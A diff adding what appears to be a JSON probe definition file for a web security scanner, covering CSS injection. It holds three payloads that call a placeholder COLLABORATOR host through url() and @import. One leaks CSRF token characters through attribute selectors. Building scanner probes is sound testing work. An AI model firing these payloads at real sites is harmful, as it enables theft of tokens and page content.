@@ -1,0 +1,46 @@
+{
+  "category": "css_injection",
+  "contexts": {
+    "data_exfiltration": {
+      "description": "CSS injection for data exfiltration -- use CSS selectors and url() to leak page content character by character to attacker server",
+      "tech_match": ["CSS", "HTML"],
+      "param_match": ["style", "css", "color", "background", "theme", "template", "class"],
+      "probes": [
+        {
+          "payload": "background:url(https://COLLABORATOR/?css-inject)",
+          "description": "Basic CSS injection probe -- if value appears in style attribute or <style> block, confirms CSS injection via OOB callback",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "};@import url(https://COLLABORATOR/?css-import);.x{",
+          "description": "@import injection -- close existing rule and inject external stylesheet import for full CSS control",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "attribute_selector_exfil": {
+      "description": "CSS attribute selector exfiltration -- leak CSRF tokens, input values, or hidden field content via CSS selectors with url() callbacks",
+      "tech_match": ["CSS", "HTML"],
+      "param_match": ["style", "css", "theme"],
+      "probes": [
+        {
+          "payload": "input[name=csrf][value^=a]{background:url(https://COLLABORATOR/?v=a)}",
+          "description": "CSRF token exfiltration via CSS attribute selector -- fires callback when token starts with 'a'. Repeat for each character position to extract full token.",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        }
+      ]
+    }
+  }
+}
